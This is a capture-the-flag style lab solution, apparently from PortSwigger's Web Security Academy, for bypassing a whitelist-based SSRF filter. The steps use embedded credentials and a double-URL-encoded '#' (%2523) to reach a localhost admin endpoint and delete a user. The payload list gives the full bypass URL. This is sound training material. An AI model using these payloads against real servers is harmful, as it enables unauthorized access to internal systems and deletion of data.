## SSRF with whitelist-based input filter

**Category:** ssrf
**Difficulty:** Unknown

### Description
This lab has a stock check feature which fetches data from an internal system.

### Solution Steps
1. Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
2. Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the application is parsing the URL, extracting the hostname, and validating it against a whitelist.
3. Change the URL to http://username@stock.weliketoshop.net/ and observe that this is accepted, indicating that the URL parser supports embedded credentials.
4. Append a # to the username and observe that the URL is now rejected.
5. Double-URL encode the # to %2523 and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username".
6. To access the admin interface and delete the target user, change the URL to: http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos

### Key Payloads
- `http://localhost/admin`
- `carlos`
- `stockApi`
- `http://127.0.0.1/`
- `http://username@stock.weliketoshop.net/`
- `%2523`
- `http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: ssrf

---
*Source: PortSwigger Web Security Academy*
